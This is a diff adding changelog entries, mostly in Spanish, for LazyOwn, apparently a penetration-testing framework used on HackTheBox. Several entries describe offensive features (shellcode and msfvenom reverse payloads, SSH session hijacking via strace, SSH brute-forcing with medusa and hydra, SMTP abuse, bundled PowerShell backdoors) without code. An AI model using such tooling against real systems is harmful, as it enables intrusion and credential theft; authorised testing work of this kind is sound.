+  *   * refactor(refactor): se agrega la libreria colors en modules para usar colorines en los modulos \n\n Version: release/0.1.19 \n\n se agrega un script que hace seo a rhost, ademas de un poco de scraping para darnos datos sobre el host \n\n  Modified file(s): - COMMANDS.md - DEPLOY.sh - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazyproxy.py\n  Deleted file(s): \n  Created file(s):  \n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 20 02:20:17 2024 -0400 \n\n Hora: 1724134817
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): dos comandos nuevos, skipfish y createdll, nuevo shellcode \n\n Version: release/0.1.19 \n\n nuevos recursos \n\n  Modified file(s): - .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 19 02:20:52 2024 -0400 \n\n Hora: 1724048452
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): create new command shellcode, run lazymsfvenom modified to create shellcode.sh \n\n Version: release/0.1.18 \n\n modify find command to add the one linner to more pleassure \n\n  Modified file(s): - COMMANDS.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - utils.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 19 00:35:53 2024 -0400 \n\n Hora: 1724042153
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(new feat): new funcionality in proxy command, hexdump on screen, capacity to edit responces from client and server :) mitm ? xD now only prints the thata before sent \n\n Version: release/0.1.17 \n\n and alien gray at the banner :P \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - modules/lazyproxy.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 21:12:26 2024 -0400 \n\n Hora: 1724029946
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new prompt \n\n Version: release/0.1.16 \n\n now show the url of the target \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 18:46:18 2024 -0400 \n\n Hora: 1724021178
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new command set_proxychains \n\n Version: release/0.1.15 \n\n documented at COMMANDS.md more info use help set_proxychains \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 16:41:31 2024 -0400 \n\n Hora: 1724013691
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(bug fixing): bug fixing in vars of DEPLOY.sh \n\n Version: release/0.1.14 \n\n was created readme_file_html to avoid the bug \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 18 16:37:23 2024 -0400 \n\n Hora: 1724013443
+
+
+### Otros
+
+### Otros
+
+  *   * feature(new payload in msfvenom android): new options in msf rev android \n\n Version: release/0.1.13 \n\n bug fixing in DEPLOY.sh duplicated function \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 17 06:44:52 2024 -0400 \n\n Hora: 1723891492
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(documented): agradecimientos \n\n Version: release/0.1.12 \n\n a ✌ el creador de sicat \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 17 06:39:12 2024 -0400 \n\n Hora: 1723891152
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(implement sicat libs): to ss command \n\n Version: release/0.1.12 \n\n agradecimientos al creador de sicat tremanda t00l todo el credito a sus autores https://github.com/justakazh/sicat/ \n\n - COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - utils.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 17 02:40:13 2024 -0400 \n\n Hora: 1723876813
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(some fixes): html and new patreon :) \n\n Version: release/0.1.11 \n\n :) \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 21:52:15 2024 -0400 \n\n Hora: 1723859535
+
+
+### Otros
+
+### Otros
+
+  *   * feature(new tools): new commands, new payloads in find, new cves, new machine \n\n Version: release/0.1.10 \n\n from ping to r00t https://www.youtube.com/watch?v=v3XCNM9n534 \n\n - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 16:56:04 2024 -0400 \n\n Hora: 1723841764
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(new feature): new command finalrecon docuemnted at COMMANDS.md \n\n Version: release/0.1.9 \n\n new tool file to pwntomate to perform aun automated scann \n\n - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 02:57:52 2024 -0400 \n\n Hora: 1723791472
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(command): new commando swaks to abuse of smtp \n\n Version: release/0.1.8 \n\n helper to perfom abuse to smtp server \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 16 02:35:16 2024 -0400 \n\n Hora: 1723790116
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix in vpn): new machine \n\n Version: release/0.1.7 \n\n chenges in payload.json \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 23:58:16 2024 -0400 \n\n Hora: 1723780696
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(deleted files): index.sh y dump_readme.sh \n\n Version: release/0.1.6 \n\n se eliminana estos archivos para limpiar un poco de scripts el directorio principal \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - dump_readme.sh - index.sh  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 23:55:59 2024 -0400 \n\n Hora: 1723780559
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor DEPLOY, sessionstrace): se crea todo en un solo archivo deploy y se eliminaran en el proximo commit index.sh ydump_readme.sh \n\n Version: release/0.1.6 \n\n el ataque ahora es capaz de generar una salida en el directorio sessions/strace.txt y muestra una salida bastante legible, mucho mas que la primera poc \n\n - COMMANDS.md - DEPLOY.sh - README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 20:15:03 2024 -0400 \n\n Hora: 1723767303
+
+
+### Otros
+
+### Otros
+
+  *   * feature(sessionssh y sessionsshstrace): nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.6 \n\n genera un ataque de secuetro de proceso con strace permitiendo observar la session ssh commandos, y salida de los comandos \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 19:06:13 2024 -0400 \n\n Hora: 1723763173
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testing Changelog): new method to create changelog \n\n Version: release/0.1.5 \n\n testing this method \n\n - CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 18:43:06 2024 -0400 \n\n Hora: 1723761786
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(lazyscripts): se crea el comando y el directorio lazyscripts el cual recive como parametro un nombre de chivo \n\n Version: release/0.1.5 \n\n ese archivo debe estar en el direcorio lazyscripts estos archivos cuentan con comandos que seran ejecutados en batch :) \n\n - COMMANDS.md - README.md - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 18:16:02 2024 -0400 \n\n Hora: 1723760162
+
+
+### Otros
+
+### Otros
+
+  *   * feature(nuevos recursos, comandos, archivos tool para pwntomate): se cargan nuevas herramientas para download_external, nuevos comandos documentados en coomands.md, y nuevos archivos tools para pwntomate \n\n Version: release/0.1.4 \n\n tools, medusa, hydra, ssh, rdp, comandos nuevos portdiscover, portservicesdiscover, y hostdiscover, y una honeypot espectacular, junto a usernanarchy tremenda tool para generar nombres de usuario segun los parametros pasdos \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 05:24:29 2024 -0400 \n\n Hora: 1723713869
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(tool): nuevo tool a pwntomate medusa.tool \n\n Version: release/0.1.3 \n\n automatiza puertos ssh \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak - payload.json  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 05:15:06 2024 -0400 \n\n Hora: 1723713306
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(medusa): nueco comando \n\n Version: release/0.1.2 \n\n para crackear servicios ssh \n\n - COMMANDS.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 04:31:53 2024 -0400 \n\n Hora: 1723710713
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(changelog): reload \n\n Version: release/0.1.1 \n\n deleted \n\n - CHANGELOG.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 04:30:41 2024 -0400 \n\n Hora: 1723710641
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(history): reload the history deleted by error holly git :P \n\n Version: release/0.1.1 \n\n  \n\n - CHANGELOG.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:54:04 2024 -0400 \n\n Hora: 1723708444
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): fix \n\n Version: release/0.1.1 \n\n fix \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:50:40 2024 -0400 \n\n Hora: 1723708240
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): versionamiento \n\n Version:  \n\n  \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:44:46 2024 -0400 \n\n Hora: 1723707886
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): fix en los tags \n\n Version:  \n\n  \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:40:26 2024 -0400 \n\n Hora: 1723707626
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(version file):  \n\n Version:  \n\n  \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:37:59 2024 -0400 \n\n Hora: 1723707479
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(pandoc): command \n\n Version:  \n\n bad arguments \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:36:55 2024 -0400 \n\n Hora: 1723707415
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): changelog \n\n Version:  \n\n :D \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:31:11 2024 -0400 \n\n Hora: 1723707071
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fixing): fixin bug in formating of changelog \n\n Version:  \n\n :D \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:26:33 2024 -0400 \n\n Hora: 1723706793
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fixing): fixing semantic version \n\n Version:  \n\n implemented \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:20:20 2024 -0400 \n\n Hora: 1723706420
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(release): tipo release \n\n Version:  \n\n probandoe l tipo release \n\n - README.md - docs/README.html - docs/index.html - docs/index.html.bak  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:19:32 2024 -0400 \n\n Hora: 1723706372
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(error en parametro): deploy en el pandocpara generar documento de changelog \n\n Version: release/0.1.0 \n\n limieza de changelog \n\n - DEPLOY.sh - README.md - docs/README.html - docs/index.html  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 03:18:04 2024 -0400 \n\n Hora: 1723706284
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(cambio en el versionamiento semantico): se agregan release y patch \n\n Version:  \n\n al workflow \n\n - DEPLOY.sh - README.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - readmeneitor.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:57:20 2024 -0400 \n\n Hora: 1723705040
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(patching): prueba de nuevos tipos de commits \n\n Version:  \n\n en este caso patch \n\n - DEPLOY.sh - docs/index.html.bak - readmeneitor.py  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:34:57 2024 -0400 \n\n Hora: 1723703697
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testind): deploy \n\n Version: release/0.1.0 \n\n test \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:31:42 2024 -0400 \n\n Hora: 1723703502
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(semantic versioning): se implementa el versionamiento semantico utilizando el archivo versions.json y git en el archivo DEPLOY.sh \n\n Version: release/0.1.0 \n\n - la version es cargada desde git y depositada en el json, este json se utiliza para mostrar la version en el script \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 02:01:01 2024 -0400 \n\n Hora: 1723701661
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(firma de commits con pgp): cree una firmita gpg para firmar los commits \n\n Version: release/0.0.14 \n\n :D \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:52:52 2024 -0400 \n\n Hora: 1723701172
+
+
+### Otros
+
+### Otros
+
+  *   * feature(test): testing deploy feature and semantic versioning \n\n Version: release/0.1.0 \n\n - testing versioning to release/0.0.14 \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:50:07 2024 -0400 \n\n Hora: 1723701007
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(deploy): testing deploy script \n\n Version: release/0.0.13 \n\n testing semantic versioning \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:47:24 2024 -0400 \n\n Hora: 1723700844
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(bug in Deploy): not updated the index.html file in deploys \n\n Version: release/0.0.14 \n\n - changed scripts index.sh and dump_readme.sh and DEPLOY.sh \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 01:31:04 2024 -0400 \n\n Hora: 1723699864
+
+
+### Otros
+
+### Otros
+
+  *   * feature(mejoras y fixes): - se agrega un pequeño diccionario en el comando hydra, se mejroa el comando clean, se arreglan algunos bugs \n\n Version: release/0.1.0 \n\n - se agregan colorines al testmeneitor.py para ahcer check visual, mejoras en el comando vpn, en el script fast_run_as_r00t.sh, todo docuemntado en README.md \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Aug 15 00:13:04 2024 -0400 \n\n Hora: 1723695184
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(add scripts): - adding scripts on sessions/win directory a nc ps1 version \n\n Version: release/0.1.0 \n\n - 2 backdoors in ps1 i found in a machine in tryhackme xD \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 23:31:15 2024 -0400 \n\n Hora: 1723692675
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(add README.html to anchor tag in menu of index.html): - chenges in index.html in line 162 \n\n Version: release/0.0.13 \n\n added the line in li with anchor tag \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 23:25:51 2024 -0400 \n\n Hora: 1723692351
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(mejora documentaciòn): se completan varios comandos con descripciones pobres \n\n Version: release/0.0.13 \n\n se mueve el archivo READEME.html que se genera automaticamente a docs/ \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 23:00:31 2024 -0400 \n\n Hora: 1723690831
+
+
+### Otros
+
+### Otros
+
+  *   * feature(cambios en script fast_run_as_r00t.sh): se agrega la opción --vpn <NUM> para poder elegir parametricamente que vpn se elije para la ejecucion \n\n Version: release/0.1.0 \n\n se agregan metodos de control en el flujo de los comandos como la salida de SIGNAL CONTROL + D \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 18:20:13 2024 -0400 \n\n Hora: 1723674013
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(test): bad tabs in index.html \n\n Version: release/0.0.13 \n\n  \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 18:06:45 2024 -0400 \n\n Hora: 1723673205
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(cambio en index.html): tabulacion incorrecta del banner \n\n Version: release/0.0.13 \n\n corregido :D \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 18:01:05 2024 -0400 \n\n Hora: 1723672865
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): se cambia el nombre de readme.sh a dump_readme.sh para que no moleste cuando se escriba ./run junto al tab \n\n Version: release/0.0.13 \n\n prueba de que todo quede bien \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:45:42 2024 -0400 \n\n Hora: 1723671942
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.0.13 \n\n test \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:38:56 2024 -0400 \n\n Hora: 1723671536
+
+
+### Otros
+
+### Otros
+
+  *   * feature(actualizador de readme.md): con los nuevos cambios desde los scripts que generan documentaciòn \n\n Version: release/0.1.0 \n\n y prueba de deplsiegue \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:27:23 2024 -0400 \n\n Hora: 1723670843
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): new styles in html of documentation \n\n Version: release/0.0.13 \n\n  \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:06:21 2024 -0400 \n\n Hora: 1723669581
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): testing changelog \n\n Version: release/0.0.13 \n\n  \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 17:03:41 2024 -0400 \n\n Hora: 1723669421
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testing): new changelog format \n\n Version: release/0.0.13 \n\n new template \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:56:07 2024 -0400 \n\n Hora: 1723668967
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test):  \n\n Version: release/0.0.13 \n\n test \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:55:32 2024 -0400 \n\n Hora: 1723668932
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testeando): nuevo changelog \n\n Version: release/0.0.13 \n\n mejor formateado \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:47:49 2024 -0400 \n\n Hora: 1723668469
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): deploy \n\n Version: release/0.0.13 \n\n changes in changelog \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:35:12 2024 -0400 \n\n Hora: 1723667712
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testing): changelog \n\n Version: release/0.0.13 \n\n saltos de linea \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:34:08 2024 -0400 \n\n Hora: 1723667648
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(tesing): saltos de linea en commit \n\n Version: release/0.0.13 \n\n :) \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 14 16:28:47 2024 -0400 \n\n Hora: 1723667327
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(class="neon-text" on ul): :)\n\nVersion: release/0.0.13\n\n:)\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n\n\nFecha: Wed Aug 14 15:57:39 2024 -0400 - Hora: 1723665459
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(commits con fecha y hora :P): probando el despliegue\n\nVersion: release/0.0.13\n\ncon fechas\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n\n\nFecha: Wed Aug 14 15:52:12 2024 -0400 - Hora: 1723665132
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test de index.html): testeando el despliegue automatizado del sitio web de LazyOwn\n\nVersion: release/0.0.13\n\nhttps://grisuno.github.io/LazyOwn/\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test index.sh): se realizan cambios en index.sh\n\nVersion: release/0.0.13\n\nestos cambios realizan cambios en index.html con un nuevo sistema de plantillas\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(testing): Testeando el flujo de trabajo en los despliegues automatizados.\n\nVersion: release/0.0.13\n\nrevisando el nuevi versionamiento\n\n LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  LazyOwn/   https://grisuno.github.io/LazyOwn/
+
+
+### Otros
+
+### Otros
+
